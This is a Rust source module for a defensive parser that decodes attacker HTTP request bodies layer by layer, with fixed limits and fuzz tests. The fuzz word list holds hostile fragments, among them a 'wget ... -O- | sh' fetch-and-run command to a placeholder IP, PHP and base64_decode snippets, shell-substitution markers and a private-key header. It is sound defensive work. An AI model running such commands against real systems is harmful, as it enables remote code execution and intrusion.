//! X-ray of an attacker request body: opens it layer by layer (base64,
//! gzip, percent and `\x` escapes, hex) into a flat tree, so what the
//! attacker hid inside what is visible to the rules above. Attackers feed
//! this directly, so it is bounded and total: fixed limits, no recursion
//! (a work queue over an arena), and nothing found is fetched, executed or
//! resolved.

pub mod container;
pub mod decode;
pub mod key;
pub mod pieces;
pub mod shell;

pub use key::mask_ranges;
pub use pieces::{Grade, Piece, PieceKind, Policy, Role};
pub use shell::{Node, Step};

/// Version of the rules below; results derived by an older version are
/// derived again.
pub const XRAY_V: i64 = 1;

/// Deepest layer opened (the raw body is layer depth 0).
pub const MAX_DEPTH: usize = 6;

/// Decoded bytes kept per source, all layers but the raw one together, and
/// the most one decompression may give.
pub const MAX_OUTPUT: usize = 256 * 1024;

/// Layers per source, the raw one included.
pub const MAX_LAYERS: usize = 128;

/// Pieces per source.
pub const MAX_PIECES: usize = 256;

/// Recipe steps per source.
pub const MAX_STEPS: usize = 256;

/// Longest piece value or URL kept.
pub const MAX_VALUE: usize = 512;

/// URLs kept per piece.
pub const MAX_URLS: usize = 32;

/// A byte range of one layer's text (`end` exclusive).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Span {
    pub layer: usize,
    pub start: usize,
    pub end: usize,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LayerKind {
    Raw,
    /// What a request path holds past its plain part, when that is shell.
    Path,
    Query,
    Form,
    MultipartField,
    Json,
    Xml,
    Php,
    PhpCgi,
    Base64,
    Gzip,
    Hex,
    Escapes,
    Shell,
}

/// One layer: the bytes (never assumed UTF-8), where they came from.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Layer {
    pub kind: LayerKind,
    pub parent: Option<usize>,
    pub from: Option<Span>,
    pub text: Vec<u8>,
    /// Field or file name this layer's text came from (multipart, form,
    /// query).
    pub name: Option<Vec<u8>>,
    /// Sibling fields folded into this one as random padding.
    pub collapsed: usize,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OpaqueReason {
    HighEntropy,
    UnknownEncoding,
    TooDeep,
    OverLimit,
}

/// A range that looks like it hides something but was not opened.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Opaque {
    pub at: Span,
    pub reason: OpaqueReason,
}

pub use container::{Source, parse};

/// What one layer's shell text does, branches kept. `normal` is the tree
/// with hosts, URLs, file names and numbers replaced by placeholders.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Recipe {
    pub layer: usize,
    pub nodes: Vec<Node>,
    pub normal: String,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Xray {
    pub layers: Vec<Layer>,
    pub pieces: Vec<Piece>,
    pub opaque: Vec<Opaque>,
    pub recipes: Vec<Recipe>,
    /// The body is read as PHP as a whole (PHP-CGI option injection); the
    /// body layer is not copied.
    pub php_body: bool,
}

impl Xray {
    /// An x-ray holding only the raw body, as layer 0.
    pub fn new(body: &[u8]) -> Xray {
        Xray {
            layers: vec![Layer {
                kind: LayerKind::Raw,
                parent: None,
                from: None,
                text: body.to_vec(),
                name: None,
                collapsed: 0,
            }],
            ..Xray::default()
        }
    }

    /// Number of ancestors of `layer` (the raw layer has 0).
    pub fn depth(&self, layer: usize) -> usize {
        let mut depth = 0;
        let mut at = layer;
        while let Some(parent) = self.layers.get(at).and_then(|l| l.parent) {
            depth += 1;
            at = parent;
        }
        depth
    }
}

/// The limits of one source: `depth` and `layers` are fixed, `output` is
/// what is left to decode, `pieces` is what is left for pieces, and `steps`
/// is what is left for recipe steps, so a long recipe cannot starve pieces.
#[derive(Debug, Clone)]
pub struct Budget {
    depth: usize,
    output: usize,
    layers: usize,
    pieces: usize,
    steps: usize,
    /// Hash of every layer's text -> its index, so text that is already
    /// open is not opened again.
    seen: std::collections::HashMap<u64, usize>,
    /// Off for a layer that is kept under a second name.
    dedupe: bool,
}

impl Default for Budget {
    fn default() -> Budget {
        Budget {
            depth: MAX_DEPTH,
            output: MAX_OUTPUT,
            layers: MAX_LAYERS,
            pieces: MAX_PIECES,
            steps: MAX_STEPS,
            seen: std::collections::HashMap::new(),
            dedupe: true,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rand::rngs::StdRng;
    use rand::{RngExt, SeedableRng};
    use std::time::{Duration, Instant};

    /// Every limit holds and every span lies inside its layer.
    fn check(x: &Xray) {
        assert!(x.layers.len() <= MAX_LAYERS);
        assert!(x.pieces.len() <= MAX_PIECES);
        let decoded: usize = x.layers.iter().skip(1).map(|l| l.text.len()).sum();
        assert!(decoded <= MAX_OUTPUT + MAX_LAYERS * 64, "{decoded}");
        for (i, l) in x.layers.iter().enumerate() {
            assert!(x.depth(i) <= MAX_DEPTH);
            if let Some(p) = l.parent {
                assert!(p < x.layers.len());
            }
            if let Some(s) = l.from {
                inside(x, s);
            }
        }
        for p in &x.pieces {
            inside(x, p.at);
            assert!(p.value.len() <= MAX_VALUE);
        }
        for o in &x.opaque {
            inside(x, o.at);
        }
    }

    fn inside(x: &Xray, s: Span) {
        let layer = &x.layers[s.layer];
        assert!(s.start <= s.end && s.end <= layer.text.len(), "{s:?}");
    }

    /// One random input from a mix of alphabets.
    fn input(rng: &mut StdRng) -> Vec<u8> {
        const WORDS: [&[u8]; 14] = [
            b"<?php ",
            b"base64_decode('",
            b"wget http://192.0.2.1/x.sh -O- | sh",
            b"%3Cscript%3E",
            b"\\x41\\x42",
            b"Content-Disposition: form-data; name=\"a\"; filename=\"b\"\r\n\r\n",
            b"-----BEGIN OPENSSH PRIVATE KEY-----\n",
            b"$(",
            b"; ",
            b"\xef\xbb",
            b"\xe2\x82",
            b"\x00",
            b"\xff\xfe",
            b"H4sIAAAAAAAA",
        ];
        // Mostly short inputs, now and then one of the full 64 KiB.
        let len = if rng.random_range(0..4000u16) == 0 {
            rng.random_range(0..=64 * 1024usize)
        } else {
            rng.random_range(0..=96usize)
        };
        let mode = rng.random_range(0..5u8);
        let mut out = Vec::with_capacity(len);
        while out.len() < len {
            match mode {
                0 => out.push(rng.random_range(0x20..0x7fu8)),
                1 => out.push(rng.random_range(0..=255u8)),
                2 => out.extend_from_slice(WORDS[rng.random_range(0..WORDS.len())]),
                3 => {
                    let w = WORDS[rng.random_range(0..WORDS.len())];
                    out.extend_from_slice(w);
                    out.extend(
                        data_encoding::BASE64
                            .encode(&w.repeat(rng.random_range(1..8)))
                            .bytes(),
                    );
                }
                _ => out.push(
                    *b"%=&+\\xAZaz09_-/\n\0\xc3\xe2"
                        .get(rng.random_range(0..20))
                        .unwrap_or(&b'a'),
                ),
            }
        }
        out.truncate(len);
        out
    }

    #[test]
    fn arbitrary_bytes_never_panic() {
        let start = Instant::now();
        let mut rng = StdRng::seed_from_u64(0x5eed_0001);
        for _ in 0..20_000 {
            let bytes = input(&mut rng);
            let x = parse(
                Source::Request {
                    method: "POST",
                    path: "/x",
                    query: Some("a=b"),
                    body: Some(&bytes),
                    sender: None,
                },
                Policy::embedded(),
            );
            check(&x);
            for l in 0..x.layers.len() {
                for (a, b) in mask_ranges(&x, l) {
                    assert!(a <= b && b <= x.layers[l].text.len());
                }
            }
            let u = parse(
                Source::Upload {
                    name: Some("a.php"),
                    text: &bytes,
                    sender: None,
                },
                Policy::embedded(),
            );
            check(&u);
        }
        assert!(
            start.elapsed() < Duration::from_secs(30),
            "{:?}",
            start.elapsed()
        );
    }

    #[test]
    fn pathological_input_is_fast() {
        let nested = {
            let mut s = b"echo hello world, this is padded text to be opened ".repeat(4);
            for _ in 0..12 {
                s = data_encoding::BASE64.encode(&s).into_bytes();
                if s.len() > 40_000 {
                    break;
                }
            }
            s.resize(64 * 1024, b'A');
            s
        };
        for body in [b"$(".repeat(32 * 1024), b";".repeat(64 * 1024), nested] {
            let start = Instant::now();
            let x = parse(
                Source::Request {
                    method: "POST",
                    path: "/x",
                    query: None,
                    body: Some(&body),
                    sender: None,
                },
                Policy::embedded(),
            );
            check(&x);
            assert!(
                start.elapsed() < Duration::from_secs(1),
                "{:?}",
                start.elapsed()
            );
        }
    }
}
